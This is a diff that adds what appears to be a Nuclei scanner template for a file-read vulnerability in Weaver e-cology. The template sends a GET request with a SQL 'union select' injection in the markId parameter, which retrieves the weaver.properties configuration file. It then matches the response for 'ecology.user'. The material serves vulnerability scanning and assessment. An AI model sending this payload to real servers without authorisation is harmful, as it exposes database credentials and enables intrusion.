@@ -1,0 +1,25 @@
+id: Weaver-SignatureDownload-file-read
+
+info:
+  name: Weaver SignatureDownload file read
+  author: cr
+  severity: high
+  description: Weaver-SignatureDownload-file-read
+  tags: Weaver,file-read
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "ecology.user"
+        part: body
+
+      - type: status
+        status:
+          - 200
